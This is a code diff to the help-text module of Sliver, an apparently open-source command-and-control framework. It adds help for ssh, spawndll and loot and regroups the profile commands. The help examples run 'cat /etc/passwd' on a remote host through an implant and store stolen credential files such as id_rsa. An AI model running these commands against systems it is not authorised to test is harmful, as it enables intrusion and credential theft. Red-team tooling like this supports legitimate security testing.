@@ -24,23 +24,24 @@ package help
 
 import (
 	"bytes"
+	"strings"
 	"text/template"
 
 	consts "github.com/bishopfox/sliver/client/constants"
 )
 
 var (
+
+	// NOTE: For sub-commands use a "." hierarchy, for example root.sub for "sub" help
 	cmdHelp = map[string]string{
-		consts.JobsStr:            jobsHelp,
-		consts.SessionsStr:        sessionsHelp,
-		consts.BackgroundStr:      backgroundHelp,
-		consts.InfoStr:            infoHelp,
-		consts.UseStr:             useHelp,
-		consts.GenerateStr:        generateHelp,
-		consts.NewProfileStr:      newProfileHelp,
-		consts.ProfileGenerateStr: generateProfileHelp,
-		consts.StagerStr:          generateStagerHelp,
-		consts.StageListenerStr:   stageListenerHelp,
+		consts.JobsStr:          jobsHelp,
+		consts.SessionsStr:      sessionsHelp,
+		consts.BackgroundStr:    backgroundHelp,
+		consts.InfoStr:          infoHelp,
+		consts.UseStr:           useHelp,
+		consts.GenerateStr:      generateHelp,
+		consts.StagerStr:        generateStagerHelp,
+		consts.StageListenerStr: stageListenerHelp,
 
 		consts.MsfStr:              msfHelp,
 		consts.MsfInjectStr:        msfInjectHelp,
@@ -49,6 +50,7 @@ var (
 		consts.KillStr:             killHelp,
 		consts.LsStr:               lsHelp,
 		consts.CdStr:               cdHelp,
+		consts.PwdStr:              pwdHelp,
 		consts.CatStr:              catHelp,
 		consts.DownloadStr:         downloadHelp,
 		consts.UploadStr:           uploadHelp,
@@ -67,6 +69,7 @@ var (
 		consts.LoadExtensionStr:    loadExtensionHelp,
 		consts.PsExecStr:           psExecHelp,
 		consts.BackdoorStr:         backdoorHelp,
+		consts.SpawnDllStr:         spawnDllHelp,
 
 		consts.WebsitesStr:          websitesHelp,
 		consts.ScreenshotStr:        screenshotHelp,
@@ -79,6 +82,14 @@ var (
 		consts.PivotsListStr:        pivotListHelp,
 		consts.WgPortFwdStr:         wgPortFwdHelp,
 		consts.WgSocksStr:           wgSocksHelp,
+		consts.SSHStr:               sshHelp,
+
+		// Loot
+		consts.LootStr: lootHelp,
+
+		// Profiles
+		consts.ProfilesStr + "." + consts.NewStr:      newProfileHelp,
+		consts.ProfilesStr + "." + consts.GenerateStr: generateProfileHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
@@ -108,7 +119,7 @@ The follow command is used to generate a sliver Windows executable (PE) file, th
 
 The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
 then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, 
-then connect to TCP port 8888 on the server's vitual tunnel interface to establish c2 comms.
+then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
 	generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888
 
 You can also stack the C2 configuration with multiple protocols:
@@ -116,7 +127,7 @@ You can also stack the C2 configuration with multiple protocols:
 
 
 [[.Bold]][[.Underline]]++ Formats ++[[.Normal]]
-Supported output formats are Windows PE, Windows DLL, Windows Shellcode (SRDI), Mach-O, and ELF. The output format is controlled
+Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
 with the --os and --format flags.
 
 To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
@@ -183,7 +194,7 @@ To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common s
 new-profile --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--profile-name] <options>
+	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new [--profile-name] <options>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
@@ -488,6 +499,52 @@ Stop and remove an existing listener:
 
 	wg-portfwd rm 0
 `
+	sshHelp = `[[.Bold]]Command:[[.Normal]] ssh
+[[.Bold]]About:[[.Normal]] Run an one-off SSH command via the implant.
+The built-in client will use the ssh-agent to connect to the remote host.
+The username will be the current session username by default, but is configurable using the "-l" flag.
+[[.Bold]]Examples:[[.Normal]]
+
+# Connect to a remote host named "bastion" and execute "cat /etc/passwd"
+ssh bastion cat /etc/passwd
+
+# Connect to a remote host by specifying a username
+ssh -l ubuntu ec2-instance ps aux
+`
+
+	lootHelp = `[[.Bold]]Command:[[.Normal]] loot
+[[.Bold]]About:[[.Normal]] Store and share loot between operators.
+
+A piece of loot can be one of two loot types: a file or a credential. 
+
+[[.Bold]]File Loot[[.Normal]]
+A file can be binary or text, Sliver will attempt to detect the type of file automatically or you can specify 
+a file type with --file-type. You can add local files as loot using the "local" sub-command, or you can add
+files from a session using the "remote" sub-command.
+
+[[.Bold]]Credential Loot[[.Normal]]
+Credential loot can be a user/password combination, an API key, or a file. You can add user/password and API
+keys using the "creds" sub-command. To add credential files use either the "local" or "remote" sub-commands
+with a "--type cred" flag (note the distinction between loot type --type, and file type --file-type). You can
+additionally specify a --file-type (binary or text) as you would normally.
+
+[[.Bold]]Examples:[[.Normal]]
+
+# Adding a local file (file paths are relative):
+loot local ./foo.txt
+
+# Adding a remote file from the active session:
+loot remote C:/foo.txt
+
+# Adding a remote file as a credential from the active session:
+loot remote --type cred id_rsa
+
+# Display only credentials:
+loot --filter creds
+
+# Display the contents of a piece of loot:
+loot fetch
+`
 )
 
 const (
@@ -509,9 +566,9 @@ const (
 )
 
 // GetHelpFor - Get help string for a command
-func GetHelpFor(cmdName string) string {
+func GetHelpFor(cmdName []string) string {
 	if 0 < len(cmdName) {
-		if helpTmpl, ok := cmdHelp[cmdName]; ok {
+		if helpTmpl, ok := cmdHelp[strings.Join(cmdName, ".")]; ok {
 			return FormatHelpTmpl(helpTmpl)
 		}
 	}
